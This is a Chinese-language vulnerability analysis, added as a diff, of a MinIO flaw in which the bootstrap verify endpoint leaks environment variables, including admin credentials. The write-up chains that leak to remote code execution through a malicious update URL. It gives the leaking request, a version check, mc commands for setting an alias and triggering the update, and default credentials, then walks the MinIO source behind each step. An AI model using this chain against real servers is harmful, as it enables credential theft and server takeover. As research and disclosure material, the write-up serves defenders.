@@ -1,0 +1,145 @@
+# 简介
+Minio
+是一个基于Go语言的对象存储服务。它实现了大部分亚马逊S3云存储服务接口，可以看做是是S3的开源版本，非常适合于存储大容量非结构化的数据，例如图片、视频、日志文件、备份数据和容器/虚拟机镜像等。MinIO
+verify接口存在敏感信息泄漏漏洞，攻击者通过构造特殊URL地址，读取系统敏感信息。
+# 漏洞利用方式
+    版本号检测：
+    1.http请求：GET /api/v1/check-version
+    2.HTTP响应版本小于RELEASE.2023-03-20T20-16-18Z则存在漏洞。
+    信息泄漏：
+    POST /minio/bootstrap/v1/verify HTTP/1.1
+    RCE思路：
+    利用泄露的账号密码和MinIO客户端登录并设置MinIO的升级访问URL，因为MinIO对于升级包的sha256sum校验失效，所以能够有损的RCE。
+    1.设置升级url：mc alias set myminio http://ip:9000  user_R3s3arcm pwd_R3s3arcm
+    2.触发更新：mc admin update myminio -y
+# 漏洞分析
+我先访问到main.go,主函数代码主要指向“minio "github.com/minio/minio/cmd"”  
+说明Minio启动之后大部分逻辑都会在cmd这个目录中，可能会包含路由规则。
+    # https://github.com/minio/minio/blob/RELEASE.2023-03-13T19-46-17Z/main.go
+    package main // import "github.com/minio/minio"
+    import (
+        "os"
+        // MUST be first import.
+        _ "github.com/minio/minio/internal/init"
+        minio "github.com/minio/minio/cmd"
+    )
+    func main() {
+        minio.Main(os.Args)
+    }
+接下来，我看到routers.go的第75行包含路由注册，通过信息泄漏的载荷之中“bootstrap”字段结合路由注册代码，进行跟踪。
+    # https://github.com/minio/minio/blob/RELEASE.2023-03-13T19-46-17Z/cmd/routers.go line 75
+    func configureServerHandler(endpointServerPools EndpointServerPools) (http.Handler, error) {
+        // Initialize router. `SkipClean(true)` stops minio/mux from
+        // normalizing URL path minio/minio#3256
+        router := mux.NewRouter().SkipClean(true).UseEncodedPath()
+        // Initialize distributed NS lock.
+        if globalIsDistErasure {
+            registerDistErasureRouters(router, endpointServerPools)
+        }
+        // Add Admin router, all APIs are enabled in server mode.
+        registerAdminRouter(router, true)
+        // Add healthcheck router
+        registerHealthCheckRouter(router)
+        // Add server metrics router
+        registerMetricsRouter(router)
+        // Add STS router always.
+        registerSTSRouter(router)
+        // Add KMS router
+        registerKMSRouter(router)
+        // Add API router
+        registerAPIRouter(router)
+        router.Use(globalHandlers...)
+        return router, nil
+    }
+紧接着，我找到bootstrap-peer-server.go，这个文件作为后续的代码逻辑。
+    https://github.com/minio/minio/blob/RELEASE.2023-03-13T19-46-17Z/cmd/bootstrap-peer-server.go line 38
+    const (
+        bootstrapRESTVersion       = "v1"
+        bootstrapRESTVersionPrefix = SlashSeparator + bootstrapRESTVersion
+        bootstrapRESTPrefix        = minioReservedBucketPath + "/bootstrap"
+        bootstrapRESTPath          = bootstrapRESTPrefix + bootstrapRESTVersionPrefix
+    )
+在新逻辑中首先找到接收HTTP请求的函数，分别在第130行与第132行。通过代码逻辑来看，getServerSystemCfg应该作为接受参数之后
+    # https://github.com/minio/minio/blob/RELEASE.2023-03-13T19-46-17Z/cmd/bootstrap-peer-server.go line 130
+    // HealthHandler returns success if request is valid
+    func (b *bootstrapRESTServer) HealthHandler(w http.ResponseWriter, r *http.Request) {}
+    # https://github.com/minio/minio/blob/RELEASE.2023-03-13T19-46-17Z/cmd/bootstrap-peer-server.go line 132
+    func (b *bootstrapRESTServer) VerifyHandler(w http.ResponseWriter, r *http.Request) {
+        ctx := newContext(r, w, "VerifyHandler")
+        cfg := getServerSystemCfg()
+        logger.LogIf(ctx, json.NewEncoder(w).Encode(&cfg))
+    }
+继续查看getServerSystemCfg做了什么？主要获取的环境变量skipEnvs[envK]。
+    # https://github.com/minio/minio/blob/RELEASE.2023-03-13T19-46-17Z/cmd/bootstrap-peer-server.go line 110
+    func getServerSystemCfg() ServerSystemConfig {
+        envs := env.List("MINIO_")
+        envValues := make(map[string]string, len(envs))
+        for _, envK := range envs {
+            // skip certain environment variables as part
+            // of the whitelist and could be configured
+            // differently on each nodes, update skipEnvs()
+            // map if there are such environment values
+            if _, ok := skipEnvs[envK]; ok {
+                continue
+            }
+            envValues[envK] = env.Get(envK, "")
+        }
+        return ServerSystemConfig{
+            MinioEndpoints: globalEndpoints,
+            MinioEnv:       envValues,
+        }
+    }
+skipEnvs[envK]是什么呢？skipEnvs[envK]包含环境变量信息。根据官方说明，MinIO在启动时会从环境变量中读取预先设置的用户和密码，默认情况下：minioadmin/minioadmin。
+    # https://github.com/minio/minio/blob/RELEASE.2023-03-13T19-46-17Z/cmd/bootstrap-peer-server.go line 103
+    var skipEnvs = map[string]struct{}{
+        "MINIO_OPTS":         {},
+        "MINIO_CERT_PASSWD":  {},
+        "MINIO_SERVER_DEBUG": {},
+        "MINIO_DSYNC_TRACE":  {},
+    }
+我简单搜索了下MinIO项目，预先设置密码的情况还是比较严重。例如decom.sh等。
+    # https://github.com/minio/minio/blob/fb1492f5317bddb263092b69218c5a2c23025d19/docs/distributed/decom.sh line 23
+    export MC_HOST_myminio="http://minioadmin:minioadmin@localhost:9000/"
+    ./mc admin user add myminio/ minio123 minio123
+    ./mc admin user add myminio/ minio12345 minio12345
+    ./mc admin policy create myminio/ rw ./docs/distributed/rw.json
+    ./mc admin policy create myminio/ lake ./docs/distributed/rw.json
+    ./mc admin policy attach myminio/ rw --user=minio123
+    ./mc admin policy attach myminio/ lake,rw --user=minio12345
+当通过信息泄漏获得账号密码之后，可以登陆MinIO更新恶意升级URL，并且执行update触发RCE。  
+MinIO对于更新包进行了sha256sum，但是由于envMinisignPubKey为空，所以sha256sum失效了。
+    # https://github.com/minio/minio/blob/RELEASE.2023-03-13T19-46-17Z/cmd/update.go line 541
+    minisignPubkey := env.Get(envMinisignPubKey, "")
+        if minisignPubkey != "" {
+            v := selfupdate.NewVerifier()
+            u.Path = path.Dir(u.Path) + slashSeparator + releaseInfo + ".minisig"
+            if err = v.LoadFromURL(u.String(), minisignPubkey, transport); err != nil {
+                return AdminError{
+                    Code:       AdminUpdateApplyFailure,
+                    Message:    fmt.Sprintf("signature loading failed for %v with %v", u, err),
+                    StatusCode: http.StatusInternalServerError,
+                }
+            }
+            opts.Verifier = v
+        }
+我反向跟踪 verifyBinary方法，找到Update的HTTP入口，其中就包含了调用sha256sum校验。
+    # https://github.com/minio/minio/blob/6017b63a0612daa0ab9ef87804a57b899766bb9c/cmd/admin-handlers.go line 77
+    // ServerUpdateHandler - POST /minio/admin/v3/update?updateURL={updateURL}
+    // ----------    // updates all minio servers and restarts them gracefully.
+    # https://github.com/minio/minio/blob/6017b63a0612daa0ab9ef87804a57b899766bb9c/cmd/admin-handlers.go line 157
+    for _, nerr := range globalNotificationSys.VerifyBinary(ctx, u, sha256Sum, releaseInfo, reader) {
+            if nerr.Err != nil {
+                err := AdminError{
+                    Code:       AdminUpdateApplyFailure,
+                    Message:    nerr.Err.Error(),
+                    StatusCode: http.StatusInternalServerError,
+                }
+                logger.GetReqInfo(ctx).SetTags("peerAddress", nerr.Host.String())
+                logger.LogIf(ctx, fmt.Errorf("server update failed with %w", err))
+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)
+                return
+            }
+        }
+        err = verifyBinary(u, sha256Sum, releaseInfo, mode, reader)
+# 总结
+文中分析了Minio从信息泄露到RCE漏洞整条链路，内容较为浅显，不对之处希望师傅们斧正。
